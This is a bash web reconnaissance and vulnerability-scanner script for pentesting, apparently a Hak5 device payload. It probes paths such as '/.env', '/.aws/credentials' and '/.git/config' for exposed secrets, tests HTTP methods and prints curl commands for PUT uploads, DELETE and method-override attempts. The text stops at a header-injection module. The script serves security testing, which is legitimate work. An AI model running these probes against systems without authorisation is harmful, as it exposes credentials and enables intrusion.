#!/bin/bash
# Title: Curly - Web Recon & Vuln Scanner
# Description: Curl-based web reconnaissance and vulnerability testing for pentesting and bug bounty hunting
# Author: curtthecoder
# Version: 3.6

# === CONFIG ===
LOOTDIR=/root/loot/curly
INPUT=/dev/input/event0
TIMEOUT=10
DISCORD_WEBHOOK=""  # Set your Discord webhook URL here

# Severity tracking
CRITICAL_FINDINGS=0
HIGH_FINDINGS=0
MEDIUM_FINDINGS=0
LOW_FINDINGS=0
INFO_FINDINGS=0

# === CLEANUP ===
cleanup() {
    led_off 2>/dev/null
    dd if=$INPUT of=/dev/null bs=16 count=200 iflag=nonblock 2>/dev/null
    sleep 0.2
}

trap cleanup EXIT INT TERM

# === LED CONTROL ===
led_pattern() {
    . /lib/hak5/commands.sh
    HAK5_API_POST "system/led" "$1" >/dev/null 2>&1
}

led_off() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":100,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_scanning() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":500,"offms":500,"next":true,"rgb":{"1":[false,false,true],"2":[false,false,true],"3":[false,false,false],"4":[false,false,false]}},{"onms":500,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_found() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[true,false,false],"2":[true,false,false],"3":[true,false,false],"4":[true,false,false]}}]}'
}

led_success() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

# === SOUNDS ===
play_scan() { RINGTONE "scan:d=4,o=5,b=180:c,e,g" & }
play_found() { RINGTONE "found:d=8,o=6,b=200:c,e,g,c7" & }
play_complete() { RINGTONE "xp" & }

# === DISCORD NOTIFICATION ===
send_to_discord() {
    # Debug logging
    LOG "Discord function called"
    LOG "Webhook set: $([ -n "$DISCORD_WEBHOOK" ] && echo "YES" || echo "NO")"
    LOG "Loot file exists: $([ -f "$LOOTFILE" ] && echo "YES" || echo "NO")"

    if [ -z "$DISCORD_WEBHOOK" ]; then
        LOG "No Discord webhook configured, skipping"
        return
    fi

    if [ ! -f "$LOOTFILE" ]; then
        LOG "Loot file not found: $LOOTFILE"
        return
    fi

    LOG "Sending results to Discord..."

        # Build header message with proper JSON escaping
        local timestamp=$(date)
        local header_json=$(cat <<EOF
{
  "content": "**🎯 Curly Scan Complete**\n\`\`\`\nTarget: $TARGET_URL\nMode: $SCAN_MODE\nTime: $timestamp\n\`\`\`"
}
EOF
)

        # Send header
        LOG "Sending header message..."
        local header_response=$(curl -s -w "\nHTTP_CODE:%{http_code}" -H "Content-Type: application/json" \
             -d "$header_json" \
             "$DISCORD_WEBHOOK" 2>&1)
        local header_code=$(echo "$header_response" | grep "HTTP_CODE:" | cut -d: -f2)
        LOG "Header response code: $header_code"

        # Use awk to extract findings with details
        LOG "Extracting findings from loot file..."
        local findings=$(awk '
            /^\[\+\]/ {
                if ($0 ~ /IP GEOLOCATION|WAF.*CDN|TECHNOLOGY/) {
                    in_info_section=1
                    print
                    next
                } else {
                    in_info_section=0
                    next
                }
            }
            in_info_section {
                print
                next
            }
            /^\[!\]|^\[!!!\]/ {
                print
                found_marker=1
                detail_count=0
                next
            }
            found_marker && detail_count < 5 {
                if (/^[[:space:]]*$/) {
                    found_marker=0
                    next
                }
                if (/^\[\+\]|^\[!\]|^\[!!!\]/) {
                    found_marker=0
                    next
                }
                print
                detail_count++
                next
            }
            /^\[\+\]|^\[!\]|^\[!!!\]/ {
                found_marker=0
            }
        ' "$LOOTFILE")

        local findings_lines=$(echo -e "$findings" | wc -l | tr -d ' ')
        LOG "Extracted $findings_lines lines of findings"

        if [ -n "$findings" ]; then
            LOG "Sending findings to Discord..."

            # Write findings to temp file for upload
            local tmpfile="/tmp/curly_results_$$"
            echo "$findings" > "$tmpfile"

            # Upload as file attachment with message
            LOG "Uploading results file..."
            local upload_response=$(curl -s -w "\nHTTP:%{http_code}" \
                 -F "content=**📊 Scan Results**" \
                 -F "file=@$tmpfile;filename=results.txt" \
                 "$DISCORD_WEBHOOK" 2>&1)
            local upload_code=$(echo "$upload_response" | grep "HTTP:" | cut -d: -f2)
            LOG "Upload response: $upload_code"

            # Cleanup
            rm -f "$tmpfile"

            LOG "Results sent to Discord!"
        else
            # No findings, send summary
            LOG "No findings extracted, sending summary..."
            local summary_json='{"content":"**Scan Complete** - No significant findings"}'
            curl -s -H "Content-Type: application/json" \
                 -d "$summary_json" \
                 "$DISCORD_WEBHOOK" >/dev/null 2>&1
            LOG "Summary sent to Discord!"
        fi
}

# === CORE FUNCTIONS ===

# Initialize loot directory
init_loot() {
    mkdir -p "$LOOTDIR"
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    LOOTFILE="$LOOTDIR/${TARGET_HOST}_${TIMESTAMP}.txt"
    echo "=== CURLY WEB RECON SCAN ===" > "$LOOTFILE"
    echo "Target: $TARGET_URL" >> "$LOOTFILE"
    echo "Date: $(date)" >> "$LOOTFILE"
    echo "================================" >> "$LOOTFILE"
    echo "" >> "$LOOTFILE"
}

# Log to both screen and file
log_result() {
    local msg="$1"
    echo "$msg" >> "$LOOTFILE"
    LOG "$msg"
}

# Log finding with severity tracking
log_finding() {
    local severity="$1"  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    local msg="$2"

    case "$severity" in
        CRITICAL)
            CRITICAL_FINDINGS=$((CRITICAL_FINDINGS + 1))
            log_result "[!!!] $msg"
            ;;
        HIGH)
            HIGH_FINDINGS=$((HIGH_FINDINGS + 1))
            log_result "[!!] $msg"
            ;;
        MEDIUM)
            MEDIUM_FINDINGS=$((MEDIUM_FINDINGS + 1))
            log_result "[!] $msg"
            ;;
        LOW)
            LOW_FINDINGS=$((LOW_FINDINGS + 1))
            log_result "[-] $msg"
            ;;
        INFO)
            INFO_FINDINGS=$((INFO_FINDINGS + 1))
            log_result "[*] $msg"
            ;;
    esac
}

# Extract base info from URL
parse_url() {
    local url="$1"
    # Remove protocol
    TARGET_HOST=$(echo "$url" | sed -E 's|^https?://||' | cut -d'/' -f1 | cut -d':' -f1)
    TARGET_PROTO=$(echo "$url" | grep -q "https://" && echo "https" || echo "http")
}

# Follow redirects to get final URL
follow_redirects() {
    LOG "Following redirects..."
    # Use -I for HEAD request, -L to follow redirects, get final URL
    local final_url=$(curl -sIL -m $TIMEOUT "$TARGET_URL" 2>/dev/null | grep -i "^location:" | tail -1 | cut -d' ' -f2 | tr -d '\r')

    if [ -n "$final_url" ]; then
        # Update to final destination
        LOG "Redirect detected: $final_url"

        # Check if redirect is relative (starts with /)
        if [[ "$final_url" =~ ^/ ]]; then
            # Relative redirect - prepend original protocol and host
            TARGET_URL="${TARGET_PROTO}://${TARGET_HOST}${final_url}"
            LOG "Relative redirect resolved to: $TARGET_URL"
        else
            # Absolute redirect
            TARGET_URL="$final_url"
            parse_url "$TARGET_URL"
            TARGET_URL="${TARGET_PROTO}://${TARGET_HOST}"
            LOG "Updated target: $TARGET_URL"
        fi
    fi
}

# === SCAN MODULES ===

# 0. IP Geolocation Lookup
scan_ip_geolocation() {
    log_result "[+] IP GEOLOCATION LOOKUP"
    led_scanning

    # Resolve domain to IP
    LOG "Resolving IP address..."
    local target_ip=$(nslookup "$TARGET_HOST" 2>/dev/null | grep -A1 "Name:" | grep "Address:" | tail -1 | awk '{print $2}')

    # Fallback method if nslookup format differs
    if [ -z "$target_ip" ]; then
        target_ip=$(host "$TARGET_HOST" 2>/dev/null | grep "has address" | head -1 | awk '{print $4}')
    fi

    if [ -z "$target_ip" ]; then
        log_result "[*] Could not resolve IP address"
        log_result ""
        return
    fi

    log_result "[*] Target IP: $target_ip"

    # Query ipinfo.io
    LOG "Querying ipinfo.io..."
    local ipinfo=$(curl -s -m $TIMEOUT "https://ipinfo.io/${target_ip}/json" 2>/dev/null)

    if [ -z "$ipinfo" ]; then
        log_result "[*] Could not retrieve IP info"
        log_result ""
        return
    fi

    # Parse JSON fields (bash-friendly parsing)
    local hostname=$(echo "$ipinfo" | grep -o '"hostname"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local city=$(echo "$ipinfo" | grep -o '"city"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local region=$(echo "$ipinfo" | grep -o '"region"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local country=$(echo "$ipinfo" | grep -o '"country"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local loc=$(echo "$ipinfo" | grep -o '"loc"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local org=$(echo "$ipinfo" | grep -o '"org"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local postal=$(echo "$ipinfo" | grep -o '"postal"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)
    local timezone=$(echo "$ipinfo" | grep -o '"timezone"[[:space:]]*:[[:space:]]*"[^"]*"' | cut -d'"' -f4)

    # Format output nicely
    log_result ""
    log_result "━━━ IP Information ━━━"
    [ -n "$hostname" ] && log_result "  Hostname    : $hostname"
    [ -n "$city" ] && [ -n "$region" ] && log_result "  Location    : $city, $region"
    [ -n "$country" ] && log_result "  Country     : $country"
    [ -n "$postal" ] && log_result "  Postal Code : $postal"
    [ -n "$loc" ] && log_result "  Coordinates : $loc"
    [ -n "$org" ] && log_result "  Organization: $org"
    [ -n "$timezone" ] && log_result "  Timezone    : $timezone"
    log_result "━━━━━━━━━━━━━━━━━━━━━━"

    log_result ""
}

# SSL/TLS Security Analysis
scan_ssl_tls() {
    log_result "[+] SSL/TLS SECURITY ANALYSIS"
    led_scanning

    # Only scan HTTPS sites
    if [ "$TARGET_PROTO" != "https" ]; then
        log_finding "INFO" "Target uses HTTP - skipping SSL/TLS checks"
        log_result ""
        return
    fi

    LOG "Analyzing SSL/TLS configuration..."

    # Get SSL info using openssl
    local ssl_info=$(echo | timeout 5 openssl s_client -connect "${TARGET_HOST}:443" -servername "$TARGET_HOST" 2>/dev/null)

    if [ -z "$ssl_info" ]; then
        log_result "[*] Could not connect via SSL/TLS"
        log_result ""
        return
    fi

    # Certificate expiration check
    local cert_dates=$(echo "$ssl_info" | openssl x509 -noout -dates 2>/dev/null)
    local not_after=$(echo "$cert_dates" | grep "notAfter" | cut -d'=' -f2)

    if [ -n "$not_after" ]; then
        log_result "[*] Certificate expires: $not_after"

        # Check if expiring soon (within 30 days) - portable date parsing
        local expiry_epoch=$(echo "$ssl_info" | openssl x509 -noout -enddate 2>/dev/null | cut -d'=' -f2 | xargs -I{} date -d {} +%s 2>/dev/null || echo "")

        # Fallback for systems without -d flag (like macOS)
        if [ -z "$expiry_epoch" ]; then
            expiry_epoch=$(echo "$ssl_info" | openssl x509 -noout -enddate 2>/dev/null | cut -d'=' -f2 | xargs -I{} date -j -f "%b %d %T %Y %Z" {} +%s 2>/dev/null || echo "")
        fi

        if [ -n "$expiry_epoch" ] && [ "$expiry_epoch" != "" ]; then
            local current_epoch=$(date +%s)
            local days_until_expiry=$(( (expiry_epoch - current_epoch) / 86400 ))

            if [ $days_until_expiry -lt 0 ]; then
                log_finding "CRITICAL" "SSL Certificate EXPIRED!"
                play_found
                led_found
            elif [ $days_until_expiry -lt 30 ]; then
                log_finding "HIGH" "SSL Certificate expires in $days_until_expiry days"
                play_found
            else
                log_finding "INFO" "SSL Certificate valid for $days_until_expiry days"
            fi
        fi
    fi

    # Self-signed certificate check
    if echo "$ssl_info" | grep -q "self signed certificate"; then
        log_finding "HIGH" "Self-signed certificate detected"
        play_found
    fi

    # Check TLS version
    local tls_version=$(echo | timeout 3 openssl s_client -connect "${TARGET_HOST}:443" -servername "$TARGET_HOST" 2>/dev/null | grep "Protocol" | awk '{print $3}')

    if [ -n "$tls_version" ]; then
        log_result "[*] TLS Version: $tls_version"

        case "$tls_version" in
            "TLSv1"|"TLSv1.0"|"TLSv1.1")
                log_finding "HIGH" "Outdated TLS version: $tls_version (should use TLS 1.2+)"
                play_found
                ;;
            "SSLv2"|"SSLv3")
                log_finding "CRITICAL" "Insecure SSL/TLS version: $tls_version"
                play_found
                led_found
                ;;
        esac
    fi

    # Check cipher suites
    local cipher=$(echo "$ssl_info" | grep "Cipher" | head -1 | awk '{print $3}')

    if [ -n "$cipher" ]; then
        log_result "[*] Cipher Suite: $cipher"

        # Check for weak ciphers
        if echo "$cipher" | grep -qiE "(NULL|EXPORT|DES|RC4|MD5|anon)"; then
            log_finding "CRITICAL" "Weak cipher detected: $cipher"
            play_found
            led_found
        fi
    fi

    # Certificate chain validation
    if echo "$ssl_info" | grep -q "Verify return code: 0"; then
        log_result "[*] Certificate chain valid"
    else
        local verify_error=$(echo "$ssl_info" | grep "Verify return code:" | cut -d':' -f2-)
        if [ -n "$verify_error" ]; then
            log_finding "MEDIUM" "Certificate chain issue:$verify_error"
        fi
    fi

    # Test TLS 1.0/1.1 support (should be disabled)
    LOG "Testing deprecated TLS versions..."
    local tls10_test=$(echo | timeout 2 openssl s_client -connect "${TARGET_HOST}:443" -tls1 2>/dev/null | grep "Protocol")
    if [ -n "$tls10_test" ]; then
        log_finding "MEDIUM" "TLS 1.0 still supported (should be disabled)"
    fi

    local tls11_test=$(echo | timeout 2 openssl s_client -connect "${TARGET_HOST}:443" -tls1_1 2>/dev/null | grep "Protocol")
    if [ -n "$tls11_test" ]; then
        log_finding "MEDIUM" "TLS 1.1 still supported (should be disabled)"
    fi

    log_result ""
}

# 1. Information Gathering
scan_info() {
    log_result "[+] INFORMATION GATHERING"
    led_scanning

    # Get headers
    log_result "--- Response Headers ---"
    curl -sI -m $TIMEOUT "$TARGET_URL" 2>/dev/null | tr -d '\r' | tee -a "$LOOTFILE" | head -5 | while read line; do LOG "$line"; done

    # Check for security headers
    log_result ""
    log_result "--- Security Headers Check ---"
    local headers=$(curl -sI -m $TIMEOUT "$TARGET_URL" 2>/dev/null)

    [ -z "$(echo "$headers" | grep -i 'X-Frame-Options')" ] && log_finding "MEDIUM" "Missing: X-Frame-Options" && play_found
    [ -z "$(echo "$headers" | grep -i 'X-Content-Type-Options')" ] && log_finding "MEDIUM" "Missing: X-Content-Type-Options" && play_found
    [ -z "$(echo "$headers" | grep -i 'Strict-Transport-Security')" ] && log_finding "MEDIUM" "Missing: HSTS" && play_found
    [ -z "$(echo "$headers" | grep -i 'Content-Security-Policy')" ] && log_finding "MEDIUM" "Missing: CSP" && play_found

    # Server fingerprinting
    local server=$(echo "$headers" | grep -i "^Server:" | cut -d':' -f2- | tr -d '\r')
    [ -n "$server" ] && log_finding "INFO" "Server:$server"

    local powered=$(echo "$headers" | grep -i "^X-Powered-By:" | cut -d':' -f2- | tr -d '\r')
    [ -n "$powered" ] && log_finding "HIGH" "X-Powered-By:$powered" && play_found

    log_result ""
}

# 2. Enhanced Endpoints Discovery
scan_endpoints() {
    log_result "[+] ENHANCED ENDPOINTS DISCOVERY"
    led_scanning

    local endpoints=(
        # Common files
        "/robots.txt"
        "/sitemap.xml"
        "/sitemap_index.xml"
        "/.git/config"
        "/.git/HEAD"
        "/.git/index"
        "/.svn/entries"
        "/.hg/"
        "/.env"
        "/.aws/credentials"
        "/phpinfo.php"
        "/.well-known/security.txt"
        # Admin & Auth
        "/admin"
        "/admin.php"
        "/administrator"
        "/login"
        "/console"
        # API endpoints
        "/api"
        "/api/v1"
        "/api/v2"
        "/api/docs"
        "/swagger.json"
        "/swagger-ui.html"
        "/openapi.json"
        "/graphql"
        "/graphiql"
        # Spring Boot Actuator
        "/actuator"
        "/actuator/env"
        "/actuator/health"
        "/actuator/metrics"
        "/actuator/mappings"
        "/actuator/trace"
        # Debug & Monitoring
        "/debug"
        "/trace"
        "/metrics"
        "/health"
        "/status"
        "/info"
        # Laravel
        "/telescope"
        # Django
        "/__debug__/"
        # Tomcat
        "/manager/html"
        "/manager/status"
    )

    LOG "Checking ${#endpoints[@]} endpoints..."
    local found=0

    # Get baseline homepage content for comparison (use hash for efficient comparison)
    local homepage_response=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local homepage_hash=$(echo "$homepage_response" | md5sum | cut -d' ' -f1)
    local homepage_size=${#homepage_response}
    local homepage_title=$(echo "$homepage_response" | grep -oiE '<title>[^<]+</title>' | head -1)

    LOG "Baseline: size=$homepage_size, hash=$homepage_hash"

    for endpoint in "${endpoints[@]}"; do
        local url="${TARGET_PROTO}://${TARGET_HOST}${endpoint}"
        local status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$url" 2>/dev/null)

        if [ "$status" = "200" ]; then
            # Fetch response content for verification
            local response=$(curl -s -m $TIMEOUT "$url" 2>/dev/null)
            local response_hash=$(echo "$response" | md5sum | cut -d' ' -f1)
            local response_size=${#response}

            # FALSE POSITIVE CHECK: Compare against homepage
            # If response is identical or nearly identical to homepage, it's a soft-404
            local is_real=1
            local severity="INFO"

            # Check 1: Identical content hash (exact match = definitely fake)
            if [ "$response_hash" = "$homepage_hash" ]; then
                is_real=0
            fi

            # Check 2: Same title tag (likely same page)
            if [ $is_real -eq 1 ]; then
                local response_title=$(echo "$response" | grep -oiE '<title>[^<]+</title>' | head -1)
                if [ -n "$homepage_title" ] && [ "$response_title" = "$homepage_title" ]; then
                    # Same title - likely soft-404, but verify with size
                    local size_diff=$((response_size - homepage_size))
                    size_diff=${size_diff#-}  # Absolute value
                    # If size difference is < 5%, probably the same page
                    local threshold=$((homepage_size / 20))
                    if [ $size_diff -lt $threshold ] || [ $size_diff -lt 500 ]; then
                        is_real=0
                    fi
                fi
            fi

            # CONTENT-SPECIFIC VALIDATION for files that should have specific formats
            if [ $is_real -eq 1 ]; then
                if [[ "$endpoint" =~ ^/\.env$ ]]; then
                    # .env should contain KEY=value patterns, not HTML
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        is_real=0
                    elif ! echo "$response" | grep -qE "^[A-Z_]+=" ; then
                        is_real=0
                    else
                        severity="CRITICAL"
                    fi
                elif [[ "$endpoint" =~ phpinfo\.php$ ]]; then
                    # phpinfo.php should contain "PHP Version"
                    if ! echo "$response" | grep -qi "php version\|phpinfo()"; then
                        is_real=0
                    else
                        severity="CRITICAL"
                    fi
                elif [[ "$endpoint" =~ ^/\.(git|aws) ]]; then
                    # Git/AWS files shouldn't be HTML
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        is_real=0
                    else
                        severity="CRITICAL"
                    fi
                elif [[ "$endpoint" =~ /swagger\.json$|/openapi\.json$ ]]; then
                    # Swagger/OpenAPI should be valid JSON with specific keys
                    if ! echo "$response" | grep -qiE "\"swagger\":|\"openapi\":"; then
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /robots\.txt$ ]]; then
                    # robots.txt should have User-agent or Disallow
                    if ! echo "$response" | grep -qiE "user-agent|disallow|allow|sitemap"; then
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /sitemap.*\.xml$ ]]; then
                    # Sitemap should be XML with urlset or sitemapindex
                    if ! echo "$response" | grep -qiE "<urlset|<sitemapindex|<\?xml"; then
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /actuator ]]; then
                    # Spring Boot actuator returns JSON, not HTML
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        is_real=0
                    elif ! echo "$response" | grep -qE '^\s*\{|\['; then
                        is_real=0  # Not JSON
                    else
                        if [[ "$endpoint" =~ /actuator/(env|trace|mappings) ]]; then
                            severity="HIGH"
                        fi
                    fi
                elif [[ "$endpoint" =~ /graphql|/graphiql ]]; then
                    # GraphQL endpoints return JSON or have GraphQL UI
                    if echo "$response" | grep -qiE "graphql\|graphiql\|\"data\":\|\"errors\":"; then
                        severity="INFO"
                    else
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /(admin|console|login|administrator) ]]; then
                    # Admin pages should have login forms or admin-specific content
                    if echo "$response" | grep -qiE "login|password|username|sign.?in|admin|dashboard|authenticate"; then
                        severity="MEDIUM"
                    else
                        is_real=0  # Just the homepage, not a real admin page
                    fi
                elif [[ "$endpoint" =~ /api(/|$) ]]; then
                    # API endpoints should return JSON or API-specific content
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        # It's HTML - check if it's API documentation
                        if ! echo "$response" | grep -qiE "swagger|api.?doc|openapi"; then
                            is_real=0
                        fi
                    fi
                elif [[ "$endpoint" =~ /(debug|trace|metrics|health|status|info)$ ]]; then
                    # These should return JSON/plaintext, not HTML homepage
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /\.svn|/\.hg ]]; then
                    # SVN/Mercurial files shouldn't be HTML
                    if echo "$response" | grep -qiE "<!DOCTYPE|<html|<head"; then
                        is_real=0
                    else
                        severity="HIGH"
                    fi
                elif [[ "$endpoint" =~ /manager/(html|status) ]]; then
                    # Tomcat manager should have specific content
                    if echo "$response" | grep -qiE "tomcat|manager|application|deploy"; then
                        severity="HIGH"
                    else
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /telescope|/__debug__ ]]; then
                    # Laravel Telescope / Django Debug should have specific content
                    if echo "$response" | grep -qiE "telescope|laravel|django|debug.?toolbar"; then
                        severity="HIGH"
                    else
                        is_real=0
                    fi
                elif [[ "$endpoint" =~ /\.well-known/security\.txt$ ]]; then
                    # security.txt should have Contact: or other fields
                    if ! echo "$response" | grep -qiE "contact:|expires:|encryption:|preferred-languages:"; then
                        is_real=0
                    fi
                fi
            fi

            # Only report if it's real (not homepage/soft-404)
            if [ $is_real -eq 1 ]; then
                log_finding "$severity" "FOUND [$status]: $endpoint"
                found=$((found + 1))
                if [ "$severity" = "CRITICAL" ] || [ "$severity" = "HIGH" ]; then
                    play_found
                    led_found
                fi
                sleep 0.3
            fi
        elif [ "$status" = "301" ] || [ "$status" = "302" ]; then
            # Redirects - only log if redirecting to a different path (not back to homepage)
            local redirect_location=$(curl -sI -m $TIMEOUT "$url" 2>/dev/null | grep -i "^location:" | cut -d' ' -f2 | tr -d '\r')
            # Don't report if redirecting to homepage or root
            if [ -n "$redirect_location" ] && ! echo "$redirect_location" | grep -qE "^/?$|^${TARGET_URL}/?$"; then
                log_result "[*] REDIRECT [$status]: $endpoint -> $redirect_location"
                found=$((found + 1))
            fi
        fi
        sleep 0.05
    done

    if [ $found -eq 0 ]; then
        log_result "[*] No endpoints found"
    fi

    log_result ""
}

# 3. HTTP Methods Testing
scan_methods() {
    log_result "[+] HTTP METHODS TESTING"
    led_scanning

    local methods=("OPTIONS" "PUT" "DELETE" "TRACE" "PATCH")
    local found_vuln=0
    local rate_limited=0
    local found_methods=()
    local unexpected_methods=()

    LOG "Testing ${#methods[@]} HTTP methods..."

    # Get baseline GET response for comparison
    local baseline_headers=$(curl -sI -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local baseline_length=$(echo "$baseline_headers" | grep -i "^Content-Length:" | tr -d '\r' | awk '{print $2}')
    local baseline_type=$(echo "$baseline_headers" | grep -i "^Content-Type:" | tr -d '\r' | cut -d':' -f2 | cut -d';' -f1 | tr -d ' ')

    for method in "${methods[@]}"; do
        local response=$(curl -sI -X "$method" -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o "[0-9]\{3\}")

        case "$status" in
            200|201|204)
                # For OPTIONS, verify Allow header exists
                if [ "$method" = "OPTIONS" ]; then
                    local allow_header=$(echo "$response" | grep -i "^Allow:")
                    if [ -z "$allow_header" ]; then
                        # No Allow header = not a real OPTIONS response
                        continue
                    fi
                    log_finding "MEDIUM" "$method ENABLED: HTTP $status"
                    log_result "    $allow_header"
                    play_found
                    led_found
                    found_vuln=1
                    found_methods+=("$method")
                # For PUT/DELETE/PATCH, check if response differs from baseline GET
                elif [ "$method" = "PUT" ] || [ "$method" = "DELETE" ] || [ "$method" = "PATCH" ]; then
                    local method_length=$(echo "$response" | grep -i "^Content-Length:" | tr -d '\r' | awk '{print $2}')
                    local method_type=$(echo "$response" | grep -i "^Content-Type:" | tr -d '\r' | cut -d':' -f2 | cut -d';' -f1 | tr -d ' ')

                    # If response is identical to GET (same size, same type=HTML), server is just ignoring the method
                    if [ "$method_length" = "$baseline_length" ] && echo "$method_type" | grep -qi "text/html"; then
                        # Server returned homepage - not a real vulnerability
                        continue
                    fi

                    # 201 Created is a strong indicator the method actually works
                    if [ "$status" = "201" ]; then
                        log_finding "HIGH" "$method ENABLED: HTTP $status (Created)"
                        play_found
                        led_found
                        found_vuln=1
                        found_methods+=("$method")
                    # 204 No Content suggests method was processed
                    elif [ "$status" = "204" ]; then
                        log_finding "MEDIUM" "$method ENABLED: HTTP $status (No Content)"
                        play_found
                        led_found
                        found_vuln=1
                        found_methods+=("$method")
                    # Different content-type (e.g., JSON) suggests API endpoint
                    elif [ "$method_type" != "$baseline_type" ] && [ -n "$method_type" ]; then
                        log_finding "MEDIUM" "$method may be enabled: HTTP $status (different response type: $method_type)"
                        play_found
                        found_vuln=1
                        found_methods+=("$method")
                    fi
                    # If none of the above, it's likely a false positive - skip it
                # For TRACE, any 200 response is concerning (XST)
                elif [ "$method" = "TRACE" ]; then
                    log_finding "MEDIUM" "$method ENABLED: HTTP $status"
                    play_found
                    led_found
                    found_vuln=1
                    found_methods+=("$method")
                fi
                sleep 0.3
                ;;
            429|503)
                # Rate limited or service unavailable
                log_finding "INFO" "$method rate limited: HTTP $status"
                rate_limited=1
                ;;
            405|501)
                # Properly blocked - this is good (405=Not Allowed, 501=Not Implemented)
                # Don't log these, they're secure
                ;;
            000|"")
                # Timeout or no response - don't log
                ;;
            *)
                # Other status codes - might be interesting
                log_finding "LOW" "$method unexpected: HTTP $status"
                unexpected_methods+=("$method:$status")
                ;;
        esac
        sleep 0.1
    done

    if [ $found_vuln -eq 0 ] && [ $rate_limited -eq 0 ]; then
        log_result "[*] All methods properly blocked"
    elif [ $found_vuln -eq 0 ] && [ $rate_limited -eq 1 ]; then
        log_result "[*] No unsafe methods detected (some rate limited)"
    fi

    # Add verification guide if any methods were found
    if [ ${#found_methods[@]} -gt 0 ] || [ ${#unexpected_methods[@]} -gt 0 ]; then
        log_result ""
        log_result "━━━ HOW TO VERIFY HTTP METHODS ━━━"
        log_result ""

        # OPTIONS method explanation
        if [[ " ${found_methods[*]} " =~ " OPTIONS " ]]; then
            log_result "OPTIONS ENABLED:"
            log_result "  View allowed methods:"
            log_result "    curl -X OPTIONS -i \"$TARGET_URL\""
            log_result "  Look for 'Allow:' header listing permitted methods"
            log_result "  Risk: Information disclosure about server capabilities"
            log_result ""
        fi

        # PUT method explanation
        if [[ " ${found_methods[*]} " =~ " PUT " ]] || [[ " ${unexpected_methods[*]} " =~ "PUT:" ]]; then
            log_result "PUT METHOD:"
            log_result "  Test file upload (use safe filename):"
            log_result "    curl -X PUT -d 'test content' \"$TARGET_URL/test_upload_deleteme.txt\""
            log_result "  Then verify: curl \"$TARGET_URL/test_upload_deleteme.txt\""
            log_result "  Risk: Arbitrary file upload, web shell deployment, defacement"
            log_result "  Note: HTTP 411 means server requires Content-Length header:"
            log_result "    curl -X PUT -H \"Content-Length: 12\" -d 'test content' \"$TARGET_URL/test.txt\""
            log_result ""
        fi

        # DELETE method explanation
        if [[ " ${found_methods[*]} " =~ " DELETE " ]]; then
            log_result "DELETE METHOD:"
            log_result "  Test deletion (CAREFUL - use non-existent file):"
            log_result "    curl -X DELETE -i \"$TARGET_URL/nonexistent_file_12345.txt\""
            log_result "  Risk: Arbitrary file deletion, data destruction"
            log_result "  WARNING: Do NOT test on real files without authorization!"
            log_result ""
        fi

        # TRACE method explanation
        if [[ " ${found_methods[*]} " =~ " TRACE " ]]; then
            log_result "TRACE METHOD (XST - Cross-Site Tracing):"
            log_result "  Test for request reflection:"
            log_result "    curl -X TRACE -H \"X-Test: sensitive_data\" \"$TARGET_URL\""
            log_result "  If response contains your headers, XST is possible"
            log_result "  Risk: Cookie theft via XSS+XST, credential harvesting"
            log_result "  Combined with XSS, can bypass HttpOnly cookie protection"
            log_result ""
        fi

        # PATCH method explanation
        if [[ " ${found_methods[*]} " =~ " PATCH " ]]; then
            log_result "PATCH METHOD:"
            log_result "  Test partial resource modification:"
            log_result "    curl -X PATCH -H \"Content-Type: application/json\" -d '{\"field\":\"value\"}' \"$TARGET_URL\""
            log_result "  Risk: Unauthorized data modification"
            log_result "  Often used in REST APIs - check if authentication is required"
            log_result ""
        fi

        log_result "GENERAL TESTING TIPS:"
        log_result "  1. Test methods on specific endpoints, not just root:"
        log_result "     curl -X PUT \"$TARGET_URL/api/users/1\""
        log_result "     curl -X DELETE \"$TARGET_URL/api/posts/1\""
        log_result "  2. Try with authentication headers if you have creds:"
        log_result "     curl -X DELETE -H \"Authorization: Bearer TOKEN\" \"$TARGET_URL/resource\""
        log_result "  3. Check if WebDAV is enabled (common with PUT/DELETE):"
        log_result "     curl -X PROPFIND -H \"Depth: 1\" \"$TARGET_URL\""
        log_result "  4. Test for method override headers:"
        log_result "     curl -X POST -H \"X-HTTP-Method-Override: DELETE\" \"$TARGET_URL\""
        log_result "     curl -X POST -H \"X-Method-Override: PUT\" \"$TARGET_URL\""
        log_result "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    fi

    log_result ""
}

# 4. Header Injection Tests
scan_headers() {
    log_result "[+] HEADER INJECTION TESTS"
    led_scanning

    # X-Forwarded-For
